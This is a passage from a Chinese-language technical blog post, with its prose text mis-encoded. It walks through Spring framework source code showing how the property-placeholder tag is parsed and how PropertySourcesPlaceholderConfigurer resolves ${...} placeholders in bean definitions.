class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Parse the elements at the root level in the document:</span></span><br><span class="line"><span class="comment">	 * "import", "alias", "bean".</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> root the DOM root element of the document</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">parseBeanDefinitions</span><span class="params">(Element root, BeanDefinitionParserDelegate delegate)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line">			NodeList nl = root.getChildNodes();</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nl.getLength(); i++) &#123;</span><br><span class="line">				Node node = nl.item(i);</span><br><span class="line">				<span class="keyword">if</span> (node <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">					Element ele = (Element) node;</span><br><span class="line">					<span class="keyword">if</span> (delegate.isDefaultNamespace(ele)) &#123;</span><br><span class="line">						parseDefaultElement(ele, delegate);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						delegate.parseCustomElement(ele);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			delegate.parseCustomElement(root);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>context</code>ä¸æ˜¯é»˜è®¤å‘½åç©ºé—´çš„æ ‡ç­¾ï¼Œæ‰€ä»¥èµ°<code>parseCustomElement</code>åˆ†æ”¯ã€‚</p>
<p>èµ°åˆ°<code>BeanDefinitionParserDelegate</code>çš„<code>parseCustomElement</code>æ–¹æ³•ä¸­<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BeanDefinition <span class="title">parseCustomElement</span><span class="params">(Element ele)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> parseCustomElement(ele, <span class="keyword">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> BeanDefinition <span class="title">parseCustomElement</span><span class="params">(Element ele, BeanDefinition containingBd)</span> </span>&#123;</span><br><span class="line">		String namespaceUri = getNamespaceURI(ele);</span><br><span class="line">		NamespaceHandler handler = <span class="keyword">this</span>.readerContext.getNamespaceHandlerResolver().resolve(namespaceUri);</span><br><span class="line">		<span class="keyword">if</span> (handler == <span class="keyword">null</span>) &#123;</span><br><span class="line">			error(<span class="string">"Unable to locate Spring NamespaceHandler for XML schema namespace ["</span> + namespaceUri + <span class="string">"]"</span>, ele);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> handler.parse(ele, <span class="keyword">new</span> ParserContext(<span class="keyword">this</span>.readerContext, <span class="keyword">this</span>, containingBd));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œä»<code>NamespaceHandlerResolver</code>ä¸­æ ¹æ®<code>namespaceUri</code>è·å–åˆ°å¯¹åº”çš„<code>NamespaceHandler</code>,ç„¶åè°ƒç”¨<code>handler</code>çš„<code>parse</code><br>æ–¹æ³•è¿›è¡Œè§£æï¼Œè¿”å›ä¸€ä¸ª<code>BeanDefinition</code>ï¼Œç„¶åå°±æ³¨å†Œåˆ°springä¸­äº†ã€‚</p>
<p>è¿™é‡Œçš„handlerå°±æ˜¯å‰é¢æˆ‘ä»¬çœ‹åˆ°çš„å®ç°äº†<code>NamespaceHandlerSupport</code>çš„é‚£ä¸ª<code>ContextNamespaceHandler</code>,<code>NamespaceHandlerSupport</code>ç»§æ‰¿è‡ª<code>NamespaceHandler</code>,å®ƒçš„parse æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Parses the supplied &#123;<span class="doctag">@link</span> Element&#125; by delegating to the &#123;<span class="doctag">@link</span> BeanDefinitionParser&#125; that is</span></span><br><span class="line"><span class="comment">	 * registered for that &#123;<span class="doctag">@link</span> Element&#125;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> BeanDefinition <span class="title">parse</span><span class="params">(Element element, ParserContext parserContext)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> findParserForElement(element, parserContext).parse(element, parserContext);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Locates the &#123;<span class="doctag">@link</span> BeanDefinitionParser&#125; from the register implementations using</span></span><br><span class="line"><span class="comment">	 * the local name of the supplied &#123;<span class="doctag">@link</span> Element&#125;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> BeanDefinitionParser <span class="title">findParserForElement</span><span class="params">(Element element, ParserContext parserContext)</span> </span>&#123;</span><br><span class="line">		String localName = parserContext.getDelegate().getLocalName(element);</span><br><span class="line">		BeanDefinitionParser parser = <span class="keyword">this</span>.parsers.get(localName);</span><br><span class="line">		<span class="keyword">if</span> (parser == <span class="keyword">null</span>) &#123;</span><br><span class="line">			parserContext.getReaderContext().fatal(</span><br><span class="line">					<span class="string">"Cannot locate BeanDefinitionParser for element ["</span> + localName + <span class="string">"]"</span>, element);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> parser;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>å°±æ˜¯ä»åœ¨<code>init()</code>æ–¹æ³•ä¸­æ³¨å†Œçš„<code>Parser</code>,æ ¹æ®å¯¹åº”çš„æ ‡ç­¾å‰ç¼€ï¼Œè·å–åˆ°parserï¼Œå¯¹xmlå…ƒç´ è¿›è¡Œè§£æã€‚</p>
<h2 id="ç”Ÿæ•ˆè¿‡ç¨‹"><a href="#ç”Ÿæ•ˆè¿‡ç¨‹" class="headerlink" title="ç”Ÿæ•ˆè¿‡ç¨‹"></a>ç”Ÿæ•ˆè¿‡ç¨‹</h2><p>ç”Ÿæ•ˆè¿‡ç¨‹æ˜¯åœ¨<code>BeanFactoryPostProcessor</code>è¢«è°ƒç”¨çš„è¿‡ç¨‹ä¸­ç”Ÿæ•ˆçš„, ç»§æ‰¿å…³ç³»</p>
<img src="/2016/10/31/property-placeholder/post-processors.jpg">
<p>å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸¤ä¸ªç†Ÿæ‚‰çš„ç±»â€”â€”<code>PropertySourcesPlaceholderConfigurer</code>å’Œ<code>PropertyPlaceholderConfigurer</code>ï¼Œæ­£æ˜¯<code>PropertyPlaceholderBeanDefinitionParser.getBeanClass</code>è¿”å›çš„ä¸¤ç§ç±»å‹, ä¹Ÿå°±æ˜¯è¯´ä»–ä»¬ä¸¤ä¸ªæ˜¯<code>BeanFactoryPostProcessor</code>.</p>
<h3 id="PropertySourcesPlaceholderConfigurer"><a href="#PropertySourcesPlaceholderConfigurer" class="headerlink" title="PropertySourcesPlaceholderConfigurer"></a>PropertySourcesPlaceholderConfigurer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Processing occurs by replacing $&#123;...&#125; placeholders in bean definitions by resolving each</span></span><br><span class="line"><span class="comment">	 * against this configurer's set of &#123;<span class="doctag">@link</span> PropertySources&#125;, which includes:</span></span><br><span class="line"><span class="comment">	 * &lt;ul&gt;</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;all &#123;<span class="doctag">@linkplain</span> org.springframework.core.env.ConfigurableEnvironment#getPropertySources</span></span><br><span class="line"><span class="comment">	 * environment property sources&#125;, if an &#123;<span class="doctag">@code</span> Environment&#125; &#123;<span class="doctag">@linkplain</span> #setEnvironment is present&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;&#123;<span class="doctag">@linkplain</span> #mergeProperties merged local properties&#125;, if &#123;<span class="doctag">@linkplain</span> #setLocation any&#125;</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@linkplain</span> #setLocations have&#125; &#123;<span class="doctag">@linkplain</span> #setProperties been&#125;</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@linkplain</span> #setPropertiesArray specified&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;any property sources set by calling &#123;<span class="doctag">@link</span> #setPropertySources&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;If &#123;<span class="doctag">@link</span> #setPropertySources&#125; is called, &lt;strong&gt;environment and local properties will be</span></span><br><span class="line"><span class="comment">	 * ignored&lt;/strong&gt;. This method is designed to give the user fine-grained control over property</span></span><br><span class="line"><span class="comment">	 * sources, and once set, the configurer makes no assumptions about adding additional sources.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postProcessBeanFactory</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.propertySources == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">this</span>.propertySources = <span class="keyword">new</span> MutablePropertySources();</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.environment != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">this</span>.propertySources.addLast(</span><br><span class="line">					<span class="keyword">new</span> PropertySource&lt;Environment&gt;(ENVIRONMENT_PROPERTIES_PROPERTY_SOURCE_NAME, <span class="keyword">this</span>.environment) &#123;</span><br><span class="line">						<span class="meta">@Override</span></span><br><span class="line">						<span class="function"><span class="keyword">public</span> String <span class="title">getProperty</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">							<span class="keyword">return</span> <span class="keyword">this</span>.source.getProperty(key);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				PropertySource&lt;?&gt; localPropertySource =</span><br><span class="line">						<span class="keyword">new</span> PropertiesPropertySource(LOCAL_PROPERTIES_PROPERTY_SOURCE_NAME, mergeProperties());</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">this</span>.localOverride) &#123;</span><br><span class="line">					<span class="keyword">this</span>.propertySources.addFirst(localPropertySource);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">this</span>.propertySources.addLast(localPropertySource);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanInitializationException(<span class="string">"Could not load properties"</span>, ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		processProperties(beanFactory, <span class="keyword">new</span> PropertySourcesPropertyResolver(<span class="keyword">this</span>.propertySources));</span><br><span class="line">		<span class="keyword">this</span>.appliedPropertySources = <span class="keyword">this</span>.propertySources;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ä¸Šè¿°çš„<code>localOverride</code>å˜é‡ï¼Œå®ƒå†³å®šäº†æ˜¯å¦ç”¨æœ¬åœ°çš„æ›¿æ¢ç³»ç»Ÿçš„ï¼Œä¸»è¦æ˜¯ç”¨åŠ è½½çš„é¡ºåºå‘¢æ§åˆ¶çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* &lt;p&gt;Any local properties (e.g. those added via &#123;<span class="doctag">@link</span> #setProperties&#125;, &#123;<span class="doctag">@link</span> #setLocations&#125;</span></span><br><span class="line"><span class="comment">* et al.) are added as a &#123;<span class="doctag">@code</span> PropertySource&#125;. Search precedence of local properties is</span></span><br><span class="line"><span class="comment">* based on the value of the &#123;<span class="doctag">@link</span> #setLocalOverride localOverride&#125; property, which is by</span></span><br><span class="line"><span class="comment">* default &#123;<span class="doctag">@code</span> false&#125; meaning that local properties are to be searched last, after all</span></span><br><span class="line"><span class="comment">* environment property sources.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>è·å–åˆ°æ‰€æœ‰çš„å±æ€§åˆ—è¡¨åï¼Œå¤„ç†å±æ€§å°±äº¤ç»™äº†<code>processProperties</code>è¿™ä¸ªæ–¹æ³•.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Visit each bean definition in the given bean factory and attempt to replace $&#123;...&#125; property</span></span><br><span class="line"><span class="comment">	 * placeholders with values from the given properties.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">processProperties</span><span class="params">(ConfigurableListableBeanFactory beanFactoryToProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">final</span> ConfigurablePropertyResolver propertyResolver)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line"></span><br><span class="line">		propertyResolver.setPlaceholderPrefix(<span class="keyword">this</span>.placeholderPrefix);</span><br><span class="line">		propertyResolver.setPlaceholderSuffix(<span class="keyword">this</span>.placeholderSuffix);</span><br><span class="line">		propertyResolver.setValueSeparator(<span class="keyword">this</span>.valueSeparator);</span><br><span class="line"></span><br><span class="line">		StringValueResolver valueResolver = <span class="keyword">new</span> StringValueResolver() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> String <span class="title">resolveStringValue</span><span class="params">(String strVal)</span> </span>&#123;</span><br><span class="line">				String resolved = ignoreUnresolvablePlaceholders ?</span><br><span class="line">						propertyResolver.resolvePlaceholders(strVal) :</span><br><span class="line">						propertyResolver.resolveRequiredPlaceholders(strVal);</span><br><span class="line">				<span class="keyword">return</span> (resolved.equals(nullValue) ? <span class="keyword">null</span> : resolved);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		doProcessProperties(beanFactoryToProcess, valueResolver);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>å…ˆè®¾ç½®propertyResolverçš„prefixï¼ˆé»˜è®¤æ˜¯${}ï¼‰å’Œsuffix(é»˜è®¤æ˜¯})ï¼Œä»¥åŠé»˜è®¤å€¼å¾—åˆ†éš”ç¬¦(é»˜è®¤æ˜¯:).</p>
<p>ç„¶ååˆ›å»ºäº†ä¸€ä¸ªStringValueResolver, è¿™é‡Œæ ¹æ®<code>ignoreUnresolvablePlaceholders</code>çš„å€¼æ¥è¿›è¡Œä¸åŒçš„è§£æï¼Œ</p>
<p>è¿™ä¸ªå€¼é»˜è®¤æ˜¯false, ä½†æ˜¯å¯ä»¥åœ¨æ ‡ç­¾ä¸­é…ç½®ã€‚</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsd:attribute</span> <span class="attr">name</span>=<span class="string">"ignore-unresolvable"</span> <span class="attr">type</span>=<span class="string">"xsd:boolean"</span> <span class="attr">default</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">xsd:annotation</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">xsd:documentation</span>&gt;</span>&lt;![CDATA[</span><br><span class="line">	Specifies if failure to find the property value to replace a key should be ignored.</span><br><span class="line">	Default is "false", meaning that this placeholder configurer will raise an exception</span><br><span class="line">	if it cannot resolve a key. Set to "true" to allow the configurer to pass on the key</span><br><span class="line">	to any others in the context that have not yet visited the key in question.</span><br><span class="line">				]]&gt;<span class="tag">&lt;/<span class="name">xsd:documentation</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">xsd:annotation</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">xsd:attribute</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>false</code>å°±ä»¥ä¸ºè€…é‡åˆ°æ— æ³•è§£æçš„å€¼å°±ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸</p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹<code>doProcessProperties</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doProcessProperties</span><span class="params">(ConfigurableListableBeanFactory beanFactoryToProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">		StringValueResolver valueResolver)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	BeanDefinitionVisitor visitor = <span class="keyword">new</span> BeanDefinitionVisitor(valueResolver);</span><br><span class="line"></span><br><span class="line">	String[] beanNames = beanFactoryToProcess.getBeanDefinitionNames();</span><br><span class="line">	<span class="keyword">for</span> (String curName : beanNames) &#123;</span><br><span class="line">		<span class="comment">// Check that we're not parsing our own bean definition,</span></span><br><span class="line">		<span class="comment">// to avoid failing on unresolvable placeholders in properties file locations.</span></span><br><span class="line">		<span class="keyword">if</span> (!(curName.equals(<span class="keyword">this</span>.beanName) &amp;&amp; beanFactoryToProcess.equals(<span class="keyword">this</span>.beanFactory))) &#123;</span><br><span class="line">			BeanDefinition bd = beanFactoryToProcess.getBeanDefinition(curName);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				visitor.visitBeanDefinition(bd);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(bd.getResourceDescription(), curName, ex.getMessage(), ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// New in Spring 2.5: resolve placeholders in alias target names and aliases as well.</span></span><br><span class="line">	beanFactoryToProcess.resolveAliases(valueResolver);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// New in Spring 3.0: resolve placeholders in embedded values such as annotation attributes.</span></span><br><span class="line">	beanFactoryToProcess.addEmbeddedValueResolver(valueResolver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé‡‡ç”¨çš„æ˜¯visitoræ¨¡å¼ï¼ŒæŸ¥çœ‹<code>BeanDefinitionVisitor#visitBeanDefinition</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Traverse the given BeanDefinition object and the MutablePropertyValues</span></span><br><span class="line"><span class="comment">	 * and ConstructorArgumentValues contained in them.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> beanDefinition the BeanDefinition object to traverse</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #resolveStringValue(String)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitBeanDefinition</span><span class="params">(BeanDefinition beanDefinition)</span> </span>&#123;</span><br><span class="line">		visitParentName(beanDefinition);</span><br><span class="line">		visitBeanClassName(beanDefinition);</span><br><span class="line">		visitFactoryBeanName(beanDefinition);</span><br><span class="line">		visitFactoryMethodName(beanDefinition);</span><br><span class="line">		visitScope(beanDefinition);</span><br><span class="line">		visitPropertyValues(beanDefinition.getPropertyValues());</span><br><span class="line">		ConstructorArgumentValues cas = beanDefinition.getConstructorArgumentValues();</span><br><span class="line">		visitIndexedArgumentValues(cas.getIndexedArgumentValues());</span><br><span class="line">		visitGenericArgumentValues(cas.getGenericArgumentValues());</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>ä»¥å…¶ä¸­çš„<code>visitParentName</code>ä¸ºä¾‹ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">visitParentName</span><span class="params">(BeanDefinition beanDefinition)</span> </span>&#123;</span><br><span class="line">	String parentName = beanDefinition.getParentName();</span><br><span class="line">	<span class="keyword">if</span> (parentName != <span class="keyword">null</span>) &#123;</span><br><span class="line">		String resolvedName = resolveStringValue(parentName);</span><br><span class="line">		<span class="keyword">if</span> (!parentName.equals(resolvedName)) &#123;</span><br><span class="line">			beanDefinition.setParentName(resolvedName);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å°±æ˜¯å…ˆè·å–<code>parentName</code>ï¼Œç„¶åæ›¿æ¢ç›¸åº”çš„å±æ€§ä¹‹åçš„<code>resolvedName</code>,å¦‚æœå’ŒåŸæ¥çš„ä¸ä¸€æ ·å°±è®¾ç½®<code>resolvedName</code></p>
<p>ä¸ºæ–°çš„parentName</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Resolve the given String value, for example parsing placeholders.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> strVal the original String value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the resolved String value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">resolveStringValue</span><span class="params">(String strVal)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>.valueResolver == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"No StringValueResolver specified - pass a resolver "</span> +</span><br><span class="line">				<span class="string">"object into the constructor or override the 'resolveStringValue' method"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	String resolvedValue = <span class="keyword">this</span>.valueResolver.resolveStringValue(strVal);</span><br><span class="line">	<span class="comment">// Return original String if not modified.</span></span><br><span class="line">	<span class="keyword">return</span> (strVal.equals(resolvedValue) ? strVal : resolvedValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¡ºè—¤æ‘¸ç“œ,çœ‹çœ‹<code>valueResolver</code>,å°±æ˜¯ä¹‹å‰çš„<code>StringValueResolver</code></p>
<p>è¿™æ˜¯ä¸€ä¸ªæ¥å£åªæœ‰ä¸€ä¸ªæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StringValueResolver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Resolve the given String value, for example parsing placeholders.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> strVal the original String value</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the resolved String value</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function">String <span class="title">resolveStringValue</span><span class="params">(String strVal)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹‹å‰ä¼ å…¥çš„å…¶å®å°±æ˜¯å¯¹åº”<code>ConfigurablePropertyResolver</code>çš„ä¸¤ä¸ªæ–¹æ³•, ä¹‹å‰ä¼ å…¥çš„æ˜¯å®ƒçš„å­ç±»</p>
<p><code>PropertySourcesPropertyResolver</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholders</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.nonStrictHelper == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">this</span>.nonStrictHelper = createPlaceholderHelper(<span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> doResolvePlaceholders(text, <span 